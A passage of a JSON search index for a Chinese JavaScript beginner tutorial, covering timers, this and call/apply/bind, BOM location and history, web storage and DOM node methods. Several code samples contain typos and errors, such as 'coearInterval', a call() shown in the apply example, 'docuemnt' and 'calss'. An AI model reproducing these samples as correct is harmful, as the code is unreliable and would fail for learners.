\"]},{\"header\":\"关闭定时器\",\"slug\":\"关闭定时器\",\"contents\":[\"我们刚才提到过一个 timerId，是表示这个定时器是页面上的第几个定时器\",\"这个 timerId 就是用来关闭定时器的数字\",\"我们有两个方法来关闭定时器 clearTimeout 和 clearInterval\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) clearTimeout(timerId) \",\"关闭以后，定时器就不会再执行了\",\"var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) coearInterval(timerId2) \",\"关闭以后定时器就不会再执行了\",\"原则上是clearTimeout 关闭 setTimeout，clearInterval 关闭 setInterval，但是其实是可以通用的，他们可以混着使用\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) // 关闭倒计时定时器 clearInterval(timerId) var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) // 关闭间隔定时器 clearTimeout(timerId2) \"]}]},\"/frontend/javascriptnotes/17-JavaScript%E5%9F%BA%E7%A1%80-this%E5%85%B3%E9%94%AE%E5%AD%97.html\":{\"title\":\"JavaScript基础-this关键字\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"每一个函数内部都有一个关键字是 this ，可以让我们直接使用的\",\"重点： 函数内部的 this 只和函数的调用方式有关系，和函数的定义方式没有关系\"]},{\"header\":\"this指向\",\"slug\":\"this指向\",\"contents\":[\"函数内部的 this 指向谁，取决于函数的调用方式\",\"全局定义的函数直接调用，this => window\",\"function fn() { console.log(this) } fn() // 此时 this 指向 window \",\"对象内部的方法调用，this => 调用者\",\"var obj = { fn: function () { console.log(this) } } obj.fn() // 此时 this 指向 obj \",\"定时器的处理函数，this => window\",\"setTimeout(function () { console.log(this) }, 0) // 此时定时器处理函数里面的 this 指向 window \",\"事件处理函数，this => 事件源\",\"div.onclick = function () { console.log(this) } // 当你点击 div 的时候，this 指向 div \",\"自调用函数（立即执行函数），this => window\",\"(function () { console.log(this) })() // 此时 this 指向 window \"]},{\"header\":\"call 和 apply 和 bind\",\"slug\":\"call-和-apply-和-bind\",\"contents\":[\"刚才我们说过的都是函数的基本调用方式里面的 this 指向，我们还有三个可以忽略函数本身的 this 指向转而指向别的地方，这三个方法就是 call 、 apply 、 bind，它们是强行改变 this 指向的方法\"]},{\"header\":\"call\",\"slug\":\"call\",\"contents\":[\"call 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向\",\"语法： 函数名.call(要改变的 this 指向，要给函数传递的参数1，要给函数传递的参数2， ...)\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) fn.call(obj, 1, 2) \",\"fn() 的时候，函数内部的 this 指向 window，fn.call(obj, 1, 2) 的时候，函数内部的 this 就指向了 obj 这个对象，使用 call 方法的时候会立即执行函数，第一个参数是你要改变的函数内部的 this 指向，第二个参数开始，依次是向函数传递参数\"]},{\"header\":\"apply\",\"slug\":\"apply\",\"contents\":[\"apply 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向\",\"语法： 函数名.apply(要改变的 this 指向，[要给函数传递的参数1， 要给函数传递的参数2， ...])\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) fn.call(obj, [1, 2]) \",\"fn() 的时候，函数内部的 this 指向 window，fn.apply(obj, [1, 2]) 的时候，函数内部的 this 就指向了 obj 这个对象，使用 apply 方法的时候，会立即执行函数，第一个参数是你要改变的函数内部的 this 指向，第二个参数是一个 数组，数组里面的每一项依次是向函数传递的参数\"]},{\"header\":\"bind\",\"slug\":\"bind\",\"contents\":[\"bind 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向，和 call、apply 有一些不一样，就是不会立即执行函数，而是返回一个已经改变了 this 指向的函数\",\"语法： var newFn = 函数名.bind(要改变的 this 指向); newFn(传递参数)\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) var newFn = fn.bind(obj) newFn(1, 2) \",\"bind 调用的时候，不会执行 fn 这个函数，而是返回一个新的函数，这个新的函数就是一个改变了 this 指向以后的 fn 函数，fn(1, 2) 的时候 this 指向 window，newFn(1, 2) 的时候执行的是一个和 fn 一摸一样的函数，只不过里面的 this 指向改成了 obj\"]}]},\"/frontend/javascriptnotes/18-BOM.html\":{\"title\":\"BOM\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"BOM（Browser Object Model）： 浏览器对象模型\",\"其实就是操作浏览器的一些能力\",\"我们可以操作哪些内容？\",\"获取一些浏览器的相关信息（窗口的大小）\",\"操作浏览器进行页面跳转\",\"获取当前浏览器地址栏的信息\",\"操作浏览器的滚动条\",\"浏览器的信息（浏览器的版本）\",\"让浏览器出现一个弹出框（alert / confirm / prompt）\",\"……\",\"BOM 的核心就是 window 对象，window 是浏览器内置的一个对象，里面包含着操作浏览器的方法\"]},{\"header\":\"获取浏览器窗口的尺寸\",\"slug\":\"获取浏览器窗口的尺寸\",\"contents\":[\" innerHeight 和 innerWidth\",\"这两个方法分别是用来获取浏览器窗口的宽度和高度（包含滚动条的）\",\"var windowHeight = window.innerHeight console.log(windowHeight) var windowWidth = window.innerWidth console.log(windowWidth) \"]},{\"header\":\"浏览器的弹出层\",\"slug\":\"浏览器的弹出层\",\"contents\":[\"alert 是在浏览器弹出一个提示框\",\"window.alert('我是一个提示框') \",\"这个弹出层只是一个提示内容，只有一个确定按钮\",\"点击确定按钮以后，这个提示框就消失了\",\"confirm 是在浏览器弹出一个询问框\",\"var boo = window.confirm('我是一个询问框') console.log(boo) \",\"这个弹出层有一个询问信息和两个按钮\",\"当你点击确定的时候，就会得到 true\",\"当你点击取消的时候，就会得到 false\",\"prompt 是在浏览器弹出一个输入框\",\"var str = window.prompt('请输入内容') console.log(str) \",\"这个弹出层有一个输入框和两个按钮\",\"当你点击取消的时候，得到的是 null\",\"当你点击确定的时候得到的就是你输入的内容\"]},{\"header\":\"浏览器的地址信息\",\"slug\":\"浏览器的地址信息\",\"contents\":[\"在 window 中有一个对象叫做 location，就是专门用来存储浏览器的地址栏内的信息的\"]},{\"header\":\"location.href\",\"slug\":\"location-href\",\"contents\":[\"location.href 这个属性存储的是浏览器地址栏内 url 地址的信息\",\"console.log(window.location.href) \",\"会把中文变成 url 编码的格式\",\"location.href 这个属性也可以给它赋值，赋值时用于地址的跳转\",\"window.location.href = './index.html' // 这个就会跳转页面到后面你给的那个地址 \"]},{\"header\":\"location.search\",\"slug\":\"location-search\",\"contents\":[\"location.search这个属性用于获取地址中携带的参数，符号 ？后面部分\"]},{\"header\":\"location.hash\",\"slug\":\"location-hash\",\"contents\":[\"location.hash这个属性用于获取地址中的哈希值，符号 # 后面部分\"]},{\"header\":\"location.reload\",\"slug\":\"location-reload\",\"contents\":[\"location.reload() 这个方法会重新加载一遍页面，就相当于刷新，传入参数 true 时表示强制刷新\",\"window.location.reload() \",\"注意： 不要写在全局，不然浏览器就会一直处在刷新状态\"]},{\"header\":\"浏览器的历史记录\",\"slug\":\"浏览器的历史记录\",\"contents\":[\"window 中有一个对象叫做 history，是专门用来存储历史记录信息的\"]},{\"header\":\"history.back\",\"slug\":\"history-back\",\"contents\":[\"history.back 是用来回退历史记录的，就是回到前一个页面，就相当于浏览器上的 ⬅️ 按钮\",\"window.history.back() \",\"前提是你要有上一条记录，不然就是一直在这个页面，也不会回退\"]},{\"header\":\"history.forword\",\"slug\":\"history-forword\",\"contents\":[\"history.forword 是去到下一个历史记录里面，也就是去到下一个页面，就相当于浏览器上的 ➡️ 按钮\",\"window.history.forward() \",\"前提是你要之前有过回退操作，不然的话你现在就是最后一个页面，没有下一个\"]},{\"header\":\"history.go\",\"slug\":\"history-go\",\"contents\":[\"history.go(参数)用来前进和后退，参数如果是 1 前进一个页面，如果是 -1 后退一个页面\"]},{\"header\":\"浏览器的onload 事件\",\"slug\":\"浏览器的onload-事件\",\"contents\":[\"这个不再是对象了，而是一个事件，是在页面所有资源加载完毕后执行的\",\"window.onload = function () { console.log('页面已经加载完毕') } \"]},{\"header\":\"在 html 页面中把 JS 写在 head 里面\",\"slug\":\"在-html-页面中把-js-写在-head-里面\",\"contents\":[\"<html> <head> <meta charset=\\\"UTF-8\\\" /> <script> // 这个代码执行的时候，body 还没有加载 // 这个时候我们就获取不到 body 中的那个 div // 就需要使用 window.onload 事件 window.onload = function () { // 这个函数会在页面加载完毕以后在执行 // 那么这个时候页面的 DOM 元素都已经加载了，我们就可以获取 div 了 } </script> </head> <body> <div></div> </body> </html> \"]},{\"header\":\"在 html 页面中把 JS 写在 body 最后面\",\"slug\":\"在-html-页面中把-js-写在-body-最后面\",\"contents\":[\"<html> <head> <meta charset=\\\"UTF-8\\\" /> </head> <body> <div></div> <script> // 这个代码执行的时候，body 已经加载完毕了 // 在这里就可以获取到 div，写不写 window.onload 就无所谓了 window.onload = function () { // 这个函数会在页面加载完毕以后在执行 // 那么这个时候页面的 DOM 元素都已经加载了，我们就可以获取 div 了 } </script> </body> </html> \"]},{\"header\":\"浏览器的 onscroll 事件\",\"slug\":\"浏览器的-onscroll-事件\",\"contents\":[\"这个 onscroll 事件是当浏览器的滚动条滚动的时候触发或者鼠标滚轮滚动的时候触发\",\"window.onscroll = function () { console.log('浏览器滚动了') } \",\"注意：前提是页面的高度要超过浏览器的可是窗口才可以\"]},{\"header\":\"浏览器滚动的距离\",\"slug\":\"浏览器滚动的距离\",\"contents\":[\"浏览器内的内容既然可以滚动，那么我们就可以获取到浏览器滚动的距离\",\"浏览器真的滚动了吗？\",\"其实我们的浏览器是没有滚动的，是一直在那里，那么滚动的是什么？是我们的页面\",\"，所以说，其实浏览器没有动，只不过是页面向上走了，所以，这个已经不能单纯的算是浏览器的内容了，而是我们页面的内容，所以不是在用 window 对象了，而是使用 document 对象\"]},{\"header\":\"scrollTop\",\"slug\":\"scrolltop\",\"contents\":[\"获取的是页面向上滚动的距离\",\"一共有两个获取方式\",\"document.body.scrollTop\",\"document.documentElement.scrollTop\",\"window.onscroll = function () { console.log(document.body.scrollTop) console.log(document.documentElement.scrollTop) } \",\"区别：\",\"IE 浏览器 \",\"没有 DOCTYPE 声明的时候，用这两个都行\",\"有 DOCTYPE 声明的时候，只能用 document.documentElement.scrollTop\",\"Chrome 和 FireFox \",\"没有 DOCTYPE 声明的时候，用 document.body.scrollTop\",\"有 DOCTYPE 声明的时候，用 document.documentElement.scrollTop\",\"Safari \",\"两个都不用，使用一个单独的方法 window.pageYOffset \"]},{\"header\":\"scrollLeft\",\"slug\":\"scrollleft\",\"contents\":[\"获取页面向左滚动的距离\",\"两个方法\",\"document.body.scrollLeft\",\"document.documentElementLeft\",\"window.onscroll = function () { console.log(document.body.scrollLeft) console.log(document.documentElement.scrollLeft) } \"]},{\"header\":\"本地存储\",\"slug\":\"本地存储\",\"contents\":[\"本地存储：将数据存储在本地浏览器中\",\"优点：\",\"页面刷新或者关闭不丢失数据，实现数据持久化\",\"容量较大，sessionStorage 和 localStorage 约 5M 左右\"]},{\"header\":\"localStorage\",\"slug\":\"localstorage\",\"contents\":[\"作用: 数据可以长期保留在本地浏览器中，刷新页面和关闭页面，数据也不会丢失, 除非手动删除\",\"特性：可以多窗口共享（同一浏览器可以共享），以键值对的形式存储，并且存储的是字符串，省略了 window\",\"语法： 存储数据：\",\"localStorage.setItem(key, value) \",\"获取数据：\",\"localStorage.getItem(key) \",\"删除数据：\",\"localStorage.removeItem(key) \",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>本地存储-localstorage</title> </head> <body> <script> // 本地存储 - localstorage 存储的是字符串 // 1. 存储 localStorage.setItem('age', 18) // 2. 获取 console.log(typeof localStorage.getItem('age')) // 3. 删除 localStorage.removeItem('age') </script> </body> </html> \",\"可以在浏览器使用 F12，通过 Application 查看本地数据\"]},{\"header\":\"sessionStorage\",\"slug\":\"sessionstorage\",\"contents\":[\"特性：\",\"生命周期为关闭浏览器窗口\",\"在同一个窗口（页面）下数据可以共享\",\"以键值对的形式存储使用\",\"用法跟 localStorage 基本相同\",\"语法：\",\"// 存储 sessionStorage.setItem(key,value) // 获取 sessionStorage.getItem(key) // 删除 sessionStorage.removeItem(key) \"]},{\"header\":\"localStorage 存储复杂数据类型\",\"slug\":\"localstorage-存储复杂数据类型\",\"contents\":[\"问题：本地只能存储字符串, 无法存储复杂数据类型\",\"解决方法：需要将复杂数据类型转换成 JSON 字符串, 再存储到本地\",\"语法：JSON.stringify(复杂数据类型)\",\"JSON 字符串：\",\"首先是1个字符串\",\"属性名使用双引号引起来，不能单引号\",\"属性值如果是字符串型也必须双引号\",\"<body> <script> // 本地存储复杂数据类型 var goods = { name: '小米', price: 1999 } // localStorage.setItem('goods', goods) // console.log(localStorage.getItem('goods')) // 1. 把对象转换为JSON字符串 JSON.stringify localStorage.setItem('goods', JSON.stringify(goods)) // console.log(typeof localStorage.getItem('goods')) </script> </body> \",\"问题：因为本地存储里面取出来的是字符串，不是对象，无法直接使用\",\"解决：把取出来的字符串转换为对象\",\"语法：JSON.parse(JSON字符串)\",\"<body> <script> // 本地存储复杂数据类型 var goods = { name: '小米', price: 1999 } // localStorage.setItem('goods', goods) // console.log(localStorage.getItem('goods')) // 1. 把对象转换为JSON字符串 JSON.stringify localStorage.setItem('goods', JSON.stringify(goods)) // console.log(typeof localStorage.getItem('goods')) // 2. 把JSON字符串转换为对象 JSON.parse console.log(JSON.parse(localStorage.getItem('goods'))) </script> </body> \"]}]},\"/frontend/javascriptnotes/19-DOM.html\":{\"title\":\"DOM\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"DOM（Document Object Model）： 文档对象模型\",\"其实就是操作 html 中的标签的一些能力\",\"我们可以操作哪些内容？\",\"获取一个元素\",\"移除一个元素\",\"创建一个元素\",\"向页面里面添加一个元素\",\"给元素绑定一些事件\",\"获取元素的属性\",\"给元素添加一些 css 样式\",\"...\",\"DOM 的核心对象就是 docuemnt 对象\",\"document 对象是浏览器内置的一个对象，里面存储着专门用来操作元素的各种方法\",\"DOM对象： 页面中的标签，我们通过 JS 获取到以后，就把这个对象叫做 DOM 对象\"]},{\"header\":\"获取一个元素\",\"slug\":\"获取一个元素\",\"contents\":[\"通过 JS 代码来获取页面中的标签，获取到以后我们就可以操作这些标签了\"]},{\"header\":\"getElementById\",\"slug\":\"getelementbyid\",\"contents\":[\"getElementById 是通过标签的 id 名称来获取标签的\",\"因为在一个页面中 id 是唯一的，所以获取到的就是一个元素\",\"<body> <div id=\\\"box\\\"></div> <script> // 获取到的就是页面中的那个 id 为 box 的 div 标签 var box = document.getElementById('box') console.log(box) // <div></div> </script> </body> \"]},{\"header\":\"getElementsByClassName\",\"slug\":\"getelementsbyclassname\",\"contents\":[\"getElementsByClassName 是通过标签的 class 名称来获取标签的\",\"因为页面中可能有多个元素的 class 名称一样，所以获取到的是一组元素\",\"哪怕你获取的 class 只有一个，那也是获取一组元素，只不过这一组中只有一个 DOM 元素而已\",\"<body> <div calss=\\\"box\\\"></div> <script> var box = document.getElementsByClassName('box') console.log(box) // [<div></div>] console.log(box[0]) // <div></div> </script> </body> \",\"获取到的是一组元素，是一个长得和数组一样的数据结构，但是不是数组，是 伪数组，这组数据也是按照索引排列的，所以我们想要准确的拿到这个 div，需要用索引来获取\"]},{\"header\":\"getElementsByTagName\",\"slug\":\"getelementsbytagname\",\"contents\":[\"getElementsByTagName 是用过标签的标签名称来获取标签的\",\"因为页面中可能有多个元素的标签名称一样，所以获取到的是一组元素\",\"哪怕只有一个这个标签名，那么也是获取一组元素，只不过这一组中只有一个 DOM 元素而已\",\"<body> <div></div> <script> var box = document.getElementsByTagName('div') console.log(box) // [<div></div>] console.log(box[0]) // <div></div> </script> </body> \",\"和 getElementsByClassName 一样，获取到的是一个长得很像数组的元素，必须要用索引才能得到准确的 DOM 元素\"]},{\"header\":\"querySelector\",\"slug\":\"queryselector\",\"contents\":[\"querySelector 是按照选择器的方式来获取元素，也就是说，按照我们写 CSS 的时候的选择器来获取\",\"这个方法只能获取到一个元素，并且是页面中第一个满足条件的元素\",\"console.log(document.querySelector('div')) // 获取页面中的第一个 div 元素 console.log(docuemnt.querySelector('.box')) // 获取页面中第一个有 box 类名的元素 console.log(document.querySelector('#box')) // 获取页面中第一个 id 名为 box 的元素 \"]},{\"header\":\"querySelectorAll\",\"slug\":\"queryselectorall\",\"contents\":[\"querySelectorAll 是按照选择器的方式来获取元素\",\"这个方法能获取到所有满足条件的元素，以一个伪数组的形式返回\",\"console.log(document.querySelectorAll('div')) // 获取页面中的所有的 div 元素 console.log(docuemnt.querySelectorAll('.box')) // 获取页面中所有有 box 类名的元素 \",\"获取到的是一组数据，也是需要用索引来获取到准确的每一个 DOM 元素，或者是用遍历的方式获得，没有 pop()push() 等数组方法\"]},{\"header\":\"操作元素的属性\",\"slug\":\"操作元素的属性\",\"contents\":[\"通过我们各种获取元素的方式获取到页面中的标签以后，我们可以通过操作 DOM 元素的属性，就能直接把效果展示在页面上\"]},{\"header\":\"innerHTML\",\"slug\":\"innerhtml\",\"contents\":[\"获取元素内部的 HTML 结构\",\"<body> <div> <p> <span>hello</span> </p> </div> <script> var div = document.querySelector('div') console.log(div.innerHTML) /* <p> <span>hello</span> </p> */ </script> </body> \",\"设置元素的内容\",\"<body> <div></div> <script> var div = document.querySelector('div') div.innerHTML = '<p>hello</p>' </script> </body> \",\"设置完以后，页面中的 div 元素里面就会嵌套一个 p 元素\"]},{\"header\":\"innerText\",\"slug\":\"innertext\",\"contents\":[\"获取元素内部的文本（只能获取到文本内容，获取不到 html 标签）\",\"<body> <div> <p> <span>hello</span> </p> </div> <script> var div = document.querySelector('div') console.log(div.innerText) // hello </script> </body> \",\"可以设置元素内部的文本\",\"<body> <div></div> <script> var div = document.querySelector('div') div.innerText = '<p>hello</p>' </script> </body> \",\"设置完毕以后，会把 <p>hello</p> 当作一个文本出现在 div 元素里面，而不会把 p 解析成标签\"]},{\"header\":\"操作元素常用属性\",\"slug\":\"操作元素常用属性\",\"contents\":[\"语法：\",\"对象.属性 = 值 \",\"例：\",\"<img src=\\\"./images/1.webp\\\" alt=\\\"\\\" /> \",\"//1.获取图片元素 var img = document.querySelector('img') //2.修改图片对象的属性 img.src = './images/2.webp' img.title = '小刘' \"]},{\"header\":\"getAttribute\",\"slug\":\"getattribute\",\"contents\":[\"获取元素的某个属性（包括自定义属性）\",\"<body> <div a=\\\"100\\\" class=\\\"box\\\"></div> <script> var div = document.querySelector('div') console.log(div.getAttribute('a')) // 100 console.log(div.getAttribute('class')) // box </script> </body> \"]},{\"header\":\"setAttribute\",\"slug\":\"setattribute\",\"contents\":[\"给元素设置一个属性（包括自定义属性）\",\"<body> <div></div> <script> var div = document.querySelector('div') div.setAttribute('a', 100) div.setAttribute('class', 'box') console.log(div) // <div a=\\\"100\\\" class=\\\"box\\\"></div> </script> </body> \"]},{\"header\":\"removeAttribute\",\"slug\":\"removeattribute\",\"contents\":[\"直接移除元素的某个属性\",\"<body> <div a=\\\"100\\\" class=\\\"box\\\"></div> <script> var div = document.querySelector('div') div.removeAttribute('class') console.log(div) // <div a=\\\"100\\\"></div> </script> </body> \"]},{\"header\":\"style\",\"slug\":\"style\",\"contents\":[\"专门用来给元素添加 css 样式的，添加的都是行内样式\",\"任何标签都有 style 属性，通过 style 属性可以动态更改网页标签的样式，如要遇到 CSS 属性中包含字符 - 时，要将 - 去掉并将其后面的字母改成大写，转换为小驼峰命名法，如 background-color 要写成 box.style.backgroundColor\",\"<body> <div></div> <script> var div = document.querySelector('div') div.style.width = \\\"100px\\\" div.style.height = \\\"100px\\\" div.style.backgroundColor = \\\"pink\\\" console.log(div) // <div style=\\\"width: 100px; height: 100px; background-color: pink;\\\"></div> </script> </body> \",\"页面中的 div 就会变成一个宽高都是 100，背景颜色是粉色\"]},{\"header\":\"获取元素的非行间样式\",\"slug\":\"获取元素的非行间样式\",\"contents\":[\"我们在操作 DOM 的时候，很重要的一点就是要操作元素的 css 样式，那么在操作 css 样式的时候，我们避免不了就要获取元素的样式，之前我们说过可以用 元素.style.xxx 来获取，但是这个方法只能获取到元素 行间样式，也就是写在行内的样式\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(oDiv.style.height) // 100px console.log(oDIv.style.width) // '' </script> </body> \",\"不管是外链式还是内嵌式，我们都获取不到该元素的样式\",\"这里我们就要使用getComputedStyle和 currentStyle方法来获取，这两个方法的作用是一样的，只不过一个在 非 IE 浏览器，一个在 IE 浏览器\"]},{\"header\":\"getComputedStyle（非IE使用）\",\"slug\":\"getcomputedstyle-非ie使用\",\"contents\":[\"语法：window.getComputedStyle(元素, null).要获取的属性\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(window.getComputedStyle(oDiv).width) // 100px console.log(window.getComputedStyle(oDiv).height) // 100px </script> </body> \",\"这个方法获取行间样式和非行间样式都可以\"]},{\"header\":\"currentStyle（IE使用）\",\"slug\":\"currentstyle-ie使用\",\"contents\":[\"语法： 元素.currentStyle.要获取的属性\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(oDiv.currentStyle.width) // 100px console.log(oDiv.currentStyle.height) // 100px </script> </body> \"]},{\"header\":\"className\",\"slug\":\"classname\",\"contents\":[\"专门用来操作元素的 类名的\",\"<body> <div class=\\\"box\\\"></div> <script> var div = document.querySelector('div') console.log(div.className) // box </script> </body> \",\"也可以设置元素的类名，不过是全覆盖式的操作\",\"<body> <div class=\\\"box\\\"></div> <script> var div = document.querySelector('div') div.className = 'test' console.log(div) // <div class=\\\"test\\\"></div> </script> </body> \",\"在设置的时候，不管之前有没有类名，都会全部被设置的值覆盖\"]},{\"header\":\"DOM节点\",\"slug\":\"dom节点\",\"contents\":[]},{\"header\":\"节点的分类\",\"slug\":\"节点的分类\",\"contents\":[\"DOM 的节点我们一般分为常用的三大类 元素节点 、文本节点 、 属性节点\",\"DOM01.png\",\"元素节点其实就是 HTML 标签，如上图中 head、div、body 等都属于元素节点\",\"属性节点是指 HTML 标签中的属性，如上图中 a 标签的 href 属性、div 标签的 class 属性\",\"文本节点是指 HTML 标签的文字内容，如 title 标签中的文字\",\"根节点 特指 html 标签\"]},{\"header\":\"获取节点\",\"slug\":\"获取节点\",\"contents\":[\"childNodes：获取某一个节点下所有的子一级节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.childNodes) /* NodeList(3) [text, p, text] 0: text 1: p 2: text length: 3 __proto__: NodeList */ </script> </body> \",\"我们会发现，拿到以后是一个伪数组，里面有三个节点：\",\"一个 text：从 <div> 一直到 <p> 中间有一个换行和一堆空格，这个是第一个节点，是一个文本节点\",\"一个 p：这个 p 标签就是第二个节点，这个是一个元素节点\",\"一个 text：从 </p> 一直到 </div> 中间有一个换行和一堆空格，这个是第三个节点，是一个文本节点\",\"children ：获取某一节点下所有的子一级元素节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.children) /* HTMLCollection [p] 0: p length: 1 __proto__: HTMLCollection */ </script> </body> \",\"我们发现只有一个节点了，因为 children 只要元素节点，div 下面又只有一个元素节点，就是 p，所以就只有一个，虽然只有一个，但是也是一个 伪数组\",\"firstChild：获取某一节点下子一级的第一个节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.firstChild) // #text </script> </body> \",\"这个是只获取一个节点，不再是伪数组了，获取的是第一个，第一个就是 <div> 一直到 <p> 的那个换行和空格，是个文本节点\",\"lastChild：获取某一节点下子一级的最后一个节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.lastChild) // #text </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是最后一个，最后一个就是 </p> 一直到 </div> 之间的换行和空格，是个文本节点\",\"firstElementChild：获取某一节点下子一级第一个元素节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.firstElementChild) // <p>hello</p> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是第一个 元素节点，第一个元素节点就是 p 标签，是一个元素节点\",\"lastElementChild：获取某一节点下子一级最后一个元素节点\",\"<body> <div> <p>hello</p> <p>world</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.lastElementChild) // <p>world</p> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是最后一个 元素节点，最后一个元素节点是 <p>world</p>，是一个元素节点\",\"nextSibling：获取某一个节点的 下一个兄弟节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.nextSibling) // #text </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的下一个兄弟节点，因为 id=\\\"b\\\" 的下一个节点，是两个 li 标签之间的换行和空格，所以是一个文本节点\",\"previousSibling：获取某一个节点的 上一个兄弟节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.previousSibling) // #text </script> </body> \",\"只获取一个节点，不在是伪数组，获取的是 id=\\\"b\\\" 这个 li 的上一个兄弟节点，因为 id=\\\"b\\\" 的上一个节点，是两个 li 标签之间的换行和空格，所以是一个文本节点\",\"nextElementSibling：获取某一个节点的下一个元素节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.nextElementSibling) // <li id=\\\"c\\\">!!!</li> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的下一个兄弟元素节点，因为 id=\\\"b\\\" 的下一个兄弟元素节点就是 id=\\\"c\\\" 的 li，是一个元素节点\",\"previousElementSibling：获取某一个节点的上一个元素节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.previousElementSibling) // <li id=\\\"a\\\">hello</li> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的上一个兄弟元素节点，因为 id=\\\"b\\\" 的上一个兄弟元素节点就是 id=\\\"a\\\" 的 li，是一个元素节点\",\"parentNode：获取某一个节点的父节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.parentNode) // <ul>...</ul> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是当前这个 li 的父元素节点，因为这个 li 的父亲就是 ul，所以获取到的就是 ul，是一个元素节点\",\"attributes：获取某一个 元素节点 的所有属性节点\",\"<body> <ul> <li id=\\\"a\\\" a=\\\"100\\\" test=\\\"test\\\">hello</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#a') console.log(oLi.attributes) /* NamedNodeMap {0: id, 1: a, 2: test, id: id, a: a, test: test, length: 3} 0: id 1: a 2: test length: 3 a: a id: id test: test __proto__: NamedNodeMap */ </script> </body> \",\"获取的是一组数据，是该元素的所有属性，也是一个伪数组，这个 li 有三个属性，id 、 a 、 test 三个，所以就获取到了这三个\"]},{\"header\":\"节点属性\",\"slug\":\"节点属性\",\"contents\":[\"我们已经知道节点会分成很多种，而且我们也能获取到各种不同的节点，接下来我们就来学习各种节点之间属性的区别\",\"我们先准备一段代码\",\"<body> <ul test=\\\"我是 ul 的一个属性\\\"> <li>hello</li> </ul> <script> // 先获取 ul var oUl = document.querySelector('ul') // 获取到 ul 下的第一个子元素节点，是一个元素节点 var eleNode = oUl.firstElementChild // 获取到 ul 的属性节点组合，因为是个组合，我们要拿到节点的话要用索引 var attrNode = oUl.attributes[0] // 获取到 ul 下的第一个子节点，是一个文本节点 var textNode = oUl.firstChild </script> </body> \"]},{\"header\":\"nodeType\",\"slug\":\"nodetype\",\"contents\":[\"nodeType：获取节点的节点类型，用数字表示\",\"console.log(eleNode.nodeType) // 1 console.log(attrNode.nodeType) // 2 console.log(textNode.nodeType) // 3 \",\"nodeType === 1 就表示该节点是一个 元素节点\",\"nodeType === 2 就表示该节点是一个 属性节点\",\"nodeType === 3 就表示该节点是一个 